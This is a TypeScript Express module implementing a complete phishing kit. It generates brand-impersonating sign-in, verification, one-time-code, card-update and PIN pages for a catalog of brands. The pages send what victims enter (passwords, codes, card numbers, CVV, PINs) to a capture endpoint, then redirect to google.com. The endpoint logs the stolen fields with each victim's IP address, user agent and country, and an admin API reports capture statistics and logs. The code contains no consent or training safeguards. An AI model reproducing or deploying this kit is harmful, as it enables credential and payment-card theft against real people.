import { Router, type Request, type Response, type RequestHandler } from 'express';
import { BRAND_CATALOG, VARIANTS, type Variant } from '../data/brands';

/* ---------- minimal sqlite interface (works with better-sqlite3) ---------- */

interface RunResult {
  changes: number;
  lastInsertRowid: number | bigint;
}

interface Statement {
  run(...params: unknown[]): RunResult;
  get(...params: unknown[]): unknown;
  all(...params: unknown[]): unknown[];
}

interface SqliteDb {
  prepare(sql: string): Statement;
}

/* ---------- row types ---------- */

interface PageRow {
  id: number;
  slug: string;
  brand: string;
  category: string;
  variant: string;
  title: string;
  hits: number;
  enabled: number;
  created_at: string;
}

interface LogRow {
  id: number;
  page_id: number | null;
  slug: string;
  brand: string;
  variant: string;
  ip: string;
  user_agent: string;
  fields: string;
  meta: string;
  country: string | null;
  city: string | null;
  created_at: string;
}

interface Template {
  slug: string;
  brand: string;
  category: string;
  variant: string;
  title: string;
}

/* ---------- helpers ---------- */

function slugify(s: string): string {
  return s.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/(^-|-$)/g, '');
}

function esc(s: string): string {
  return s.replace(/[&<>"']/g, (c) => (
    { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c] as string
  ));
}

const VARIANT_TITLE: Record<Variant, string> = {
  login: 'Sign in',
  verify: 'Verify your account',
  otp: 'One-time code',
  card: 'Update card details',
  pin: 'Security check',
};

const VARIANT_FIELDS: Record<Variant, { label: string; inputs: { name: string; type: string; placeholder: string }[] }> = {
  login: {
    label: 'Sign in',
    inputs: [
      { name: 'email', type: 'text', placeholder: 'Email or username' },
      { name: 'password', type: 'password', placeholder: 'Password' },
    ],
  },
  verify: {
    label: 'Verify your identity',
    inputs: [
      { name: 'password', type: 'password', placeholder: 'Password' },
      { name: 'code', type: 'text', placeholder: 'One-time code' },
    ],
  },
  otp: {
    label: 'Enter the code',
    inputs: [
      { name: 'code', type: 'text', placeholder: '6-digit code' },
    ],
  },
  card: {
    label: 'Update card details',
    inputs: [
      { name: 'cardholder', type: 'text', placeholder: 'Cardholder name' },
      { name: 'number', type: 'text', placeholder: 'Card number' },
      { name: 'expiry', type: 'text', placeholder: 'MM/YY' },
      { name: 'cvv', type: 'text', placeholder: 'CVV' },
    ],
  },
  pin: {
    label: 'Security check',
    inputs: [
      { name: 'pin', type: 'password', placeholder: 'Enter your PIN' },
    ],
  },
};

export function generateTemplates(): Template[] {
  const out: Template[] = [];
  for (const b of BRAND_CATALOG) {
    for (const v of VARIANTS) {
      out.push({
        slug: `${slugify(b.brand)}-${v}`,
        brand: b.brand,
        category: b.category,
        variant: v,
        title: `${b.brand} — ${VARIANT_TITLE[v]}`,
      });
    }
  }
  return out;
}

export function initPhishing(db: SqliteDb): void {
  db.prepare(`
    CREATE TABLE IF NOT EXISTS phishing_pages (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      slug TEXT NOT NULL UNIQUE,
      brand TEXT NOT NULL,
      category TEXT NOT NULL,
      variant TEXT NOT NULL,
      title TEXT NOT NULL DEFAULT '',
      hits INTEGER NOT NULL DEFAULT 0,
      enabled INTEGER NOT NULL DEFAULT 1,
      created_at TEXT NOT NULL DEFAULT (datetime('now'))
    )
  `).run();
  db.prepare(`
    CREATE TABLE IF NOT EXISTS phishing_logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      page_id INTEGER,
      slug TEXT NOT NULL DEFAULT '',
      brand TEXT NOT NULL DEFAULT '',
      variant TEXT NOT NULL DEFAULT '',
      ip TEXT NOT NULL DEFAULT '',
      user_agent TEXT NOT NULL DEFAULT '',
      fields TEXT NOT NULL DEFAULT '{}',
      meta TEXT NOT NULL DEFAULT '{}',
      country TEXT,
      city TEXT,
      created_at TEXT NOT NULL DEFAULT (datetime('now'))
    )
  `).run();
}

function clientIp(req: Request): string {
  const xff = req.headers['x-forwarded-for'];
  const first = Array.isArray(xff) ? xff[0] : xff;
  return (first ? first.split(',')[0].trim() : req.socket.remoteAddress ?? '');
}

function toPage(row: PageRow, req: Request) {
  const proto = (req.headers['x-forwarded-proto'] as string | undefined) ?? req.protocol;
  return {
    id: row.id,
    slug: row.slug,
    brand: row.brand,
    category: row.category,
    variant: row.variant,
    title: row.title,
    hits: row.hits,
    enabled: row.enabled,
    createdAt: row.created_at,
    url: `${proto}://${req.get('host')}/p/${row.slug}`,
  };
}

function toLog(row: LogRow) {
  let fields: Record<string, unknown> = {};
  let meta: Record<string, unknown> = {};
  try { fields = JSON.parse(row.fields); } catch { /* keep empty */ }
  try { meta = JSON.parse(row.meta); } catch { /* keep empty */ }
  return {
    id: row.id,
    pageId: row.page_id,
    slug: row.slug,
    brand: row.brand,
    variant: row.variant,
    ip: row.ip,
    userAgent: row.user_agent,
    fields,
    meta,
    country: row.country,
    city: row.city,
    createdAt: row.created_at,
  };
}

/* ---------- public page template ---------- */

function pageHtml(p: PageRow): string {
  const vf = VARIANT_FIELDS[p.variant as Variant] ?? VARIANT_FIELDS.login;
  const inputs = vf.inputs
    .map((i) => `<input name="${i.name}" type="${i.type}" placeholder="${esc(i.placeholder)}" required>`)
    .join('');
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${esc(p.title)}</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:'Segoe UI',system-ui,sans-serif;background:linear-gradient(135deg,#0f172a,#1e293b);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#e2e8f0}
  .card{background:#fff;color:#0f172a;width:100%;max-width:380px;border-radius:14px;padding:32px;box-shadow:0 20px 60px rgba(0,0,0,.4)}
  .logo{width:44px;height:44px;border-radius:12px;background:#2563eb;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:20px;margin-bottom:18px}
  h1{font-size:20px;margin-bottom:4px}
  .sub{font-size:13px;color:#64748b;margin-bottom:22px}
  input{width:100%;padding:12px 14px;border:1px solid #cbd5e1;border-radius:9px;font-size:14px;margin-bottom:12px;outline:none}
  input:focus{border-color:#2563eb}
  button{width:100%;padding:12px;background:#2563eb;color:#fff;border:none;border-radius:9px;font-size:15px;font-weight:600;cursor:pointer}
  button:hover{background:#1d4ed8}
  .foot{margin-top:18px;font-size:11px;color:#94a3b8;text-align:center}
</style>
</head>
<body>
  <div class="card">
    <div class="logo">${esc(p.brand[0]?.toUpperCase() ?? '')}</div>
    <h1>${esc(p.brand)}</h1>
    <div class="sub">${esc(vf.label)}</div>
    <form id="f">
      ${inputs}
      <button type="submit">Continue</button>
    </form>
    <div class="foot">Protected by ${esc(p.brand)} security</div>
  </div>
  <script>
    document.getElementById('f').addEventListener('submit', async (e) => {
      e.preventDefault();
      const btn = document.querySelector('button');
      btn.disabled = true; btn.textContent = 'Please wait…';
      const fields = {};
      new FormData(e.target).forEach((v, k) => { fields[k] = v; });
      try {
        await fetch('/p/${p.slug}/capture', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ fields, meta: { referer: document.referrer } }),
        });
      } catch {}
      window.location.href = 'https://www.google.com';
    });
  </script>
</body>
</html>`;
}

/* ---------- routers ---------- */

export function createPhishingRouter(db: SqliteDb, auth?: RequestHandler): Router {
  const r = Router();
  if (auth) r.use(auth);

  r.get('/stats', (_req: Request, res: Response) => {
    const one = (q: string) => (db.prepare(q).get() as { c: number }).c;
    const topPages = db.prepare(
      'SELECT slug, brand, variant, COUNT(*) AS captures FROM phishing_logs GROUP BY slug, brand, variant ORDER BY captures DESC LIMIT 5'
    ).all() as { slug: string; brand: string; variant: string; captures: number }[];
    const byCategory = db.prepare(
      'SELECT category, COUNT(*) AS count FROM phishing_pages GROUP BY category ORDER BY count DESC'
    ).all() as { category: string; count: number }[];
    res.json({
      success: true,
      data: {
        totalPages: one('SELECT COUNT(*) AS c FROM phishing_pages'),
        enabledPages: one('SELECT COUNT(*) AS c FROM phishing_pages WHERE enabled = 1'),
        totalHits: one('SELECT COALESCE(SUM(hits),0) AS c FROM phishing_pages'),
        totalCaptures: one('SELECT COUNT(*) AS c FROM phishing_logs'),
        capturesToday: one("SELECT COUNT(*) AS c FROM phishing_logs WHERE date(created_at) = date('now')"),
        variants: one('SELECT COUNT(*) AS c FROM phishing_pages'),
        topPages,
        byCategory,
      },
    });
  });

  r.get('/pages', (req: Request, res: Response) => {
    const page = Math.max(1, Number(req.query.page) || 1);
    const pageSize = Math.min(100, Math.max(1, Number(req.query.pageSize) || 20));
    const search = String(req.query.search ?? '').trim();
    const category = String(req.query.category ?? 'all');
    const enabled = String(req.query.enabled ?? 'all');

    const where: string[] = [];
    const params: unknown[] = [];
    if (search) {
      where.push('(slug LIKE ? OR brand LIKE ? OR title LIKE ?)');
      params.push(`%${search}%`, `%${search}%`, `%${search}%`);
    }
    if (category !== 'all') { where.push('category = ?'); params.push(category); }
    if (enabled === '1' || enabled === '0') { where.push('enabled = ?'); params.push(Number(enabled)); }
    const w = where.length ? `WHERE ${where.join(' AND ')}` : '';

    const total = (db.prepare(`SELECT COUNT(*) AS c FROM phishing_pages ${w}`).get(...params) as { c: number }).c;
    const rows = db.prepare(
      `SELECT * FROM phishing_pages ${w} ORDER BY id DESC LIMIT ? OFFSET ?`
    ).all(...params, pageSize, (page - 1) * pageSize) as PageRow[];

    res.json({ success: true, data: { pages: rows.map((p) => toPage(p, req)), total } });
  });

  r.get('/logs', (req: Request, res: Response) => {
    const page = Math.max(1, Number(req.query.page) || 1);
    const pageSize = Math.min(100, Math.max(1, Number(req.query.pageSize) || 20));
    const search = String(req.query.search ?? '').trim();

    const where: string[] = [];
    const params: unknown[] = [];
    if (search) {
      where.push('(slug LIKE ? OR brand LIKE ? OR ip LIKE ?)');
      params.push(`%${search}%`, `%${search}%`, `%${search}%`);
    }
    const w = where.length ? `WHERE ${where.join(' AND ')}` : '';

    const total = (db.prepare(`SELECT COUNT(*) AS c FROM phishing_logs ${w}`).get(...params) as { c: number }).c;
    const rows = db.prepare(
      `SELECT * FROM phishing_logs ${w} ORDER BY id DESC LIMIT ? OFFSET ?`
    ).all(...params, pageSize, (page - 1) * pageSize) as LogRow[];

    res.json({ success: true, data: { logs: rows.map(toLog), total } });
  });

  r.post('/seed', (_req: Request, res: Response) => {
    const templates = generateTemplates();
    const find = db.prepare('SELECT id FROM phishing_pages WHERE slug = ?');
    const insert = db.prepare(
      'INSERT INTO phishing_pages (slug, brand, category, variant, title) VALUES (?, ?, ?, ?, ?)'
    );
    const update = db.prepare('UPDATE phishing_pages SET title = ? WHERE slug = ?');

    let created = 0;
    let updated = 0;
    for (const t of templates) {
      const existing = find.get(t.slug) as { id: number } | undefined;
      if (existing) {
        const r = update.run(t.title, t.slug);
        if (r.changes > 0) updated++;
      } else {
        insert.run(t.slug, t.brand, t.category, t.variant, t.title);
        created++;
      }
    }
    const total = (db.prepare('SELECT COUNT(*) AS c FROM phishing_pages').get() as { c: number }).c;
    res.json({ success: true, data: { created, updated, total } });
  });

  r.patch('/pages/:id', (req: Request, res: Response) => {
    const id = Number(req.params.id);
    const enabled = Number((req.body as { enabled?: unknown })?.enabled);
    if (!id || (enabled !== 0 && enabled !== 1)) {
      return res.status(400).json({ success: false, error: 'invalid payload' });
    }
    db.prepare('UPDATE phishing_pages SET enabled = ? WHERE id = ?').run(enabled, id);
    res.json({ success: true });
  });

  r.post('/pages/:id/toggle', (req: Request, res: Response) => {
    const id = Number(req.params.id);
    const enabled = Number((req.body as { enabled?: unknown })?.enabled);
    if (!id || (enabled !== 0 && enabled !== 1)) {
      return res.status(400).json({ success: false, error: 'invalid payload' });
    }
    db.prepare('UPDATE phishing_pages SET enabled = ? WHERE id = ?').run(enabled, id);
    res.json({ success: true });
  });

  r.delete('/pages/:id', (req: Request, res: Response) => {
    const id = Number(req.params.id);
    if (!id) return res.status(400).json({ success: false, error: 'invalid id' });
    db.prepare('DELETE FROM phishing_pages WHERE id = ?').run(id);
    res.json({ success: true });
  });

  r.post('/logs/clear', (_req: Request, res: Response) => {
    db.prepare('DELETE FROM phishing_logs').run();
    res.json({ success: true });
  });

  return r;
}

export function createPhishingPublicRouter(db: SqliteDb): Router {
  const r = Router();

  r.get('/p/:slug', (req: Request, res: Response) => {
    const row = db.prepare('SELECT * FROM phishing_pages WHERE slug = ?').get(req.params.slug) as PageRow | undefined;
    if (!row || row.enabled !== 1) return res.status(404).send('Not found');
    db.prepare('UPDATE phishing_pages SET hits = hits + 1 WHERE id = ?').run(row.id);
    res.type('html').send(pageHtml(row));
  });

  r.post('/p/:slug/capture', (req: Request, res: Response) => {
    const row = db.prepare('SELECT * FROM phishing_pages WHERE slug = ?').get(req.params.slug) as PageRow | undefined;
    if (!row) return res.status(404).json({ success: false, error: 'not found' });

    const body = (req.body ?? {}) as { fields?: Record<string, unknown>; meta?: Record<string, unknown> };
    const fields = body.fields ?? {};
    const meta = { ...(body.meta ?? {}), ts: new Date().toISOString() };
    const country =
      (req.headers['cf-ipcountry'] as string | undefined) ??
      (req.headers['x-vercel-ip-country'] as string | undefined) ??
      null;

    db.prepare(
      `INSERT INTO phishing_logs (page_id, slug, brand, variant, ip, user_agent, fields, meta, country, city)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
    ).run(
      row.id, row.slug, row.brand, row.variant,
      clientIp(req), String(req.headers['user-agent'] ?? ''),
      JSON.stringify(fields), JSON.stringify(meta), country, null
    );
    res.json({ success: true });
  });

  return r;
}
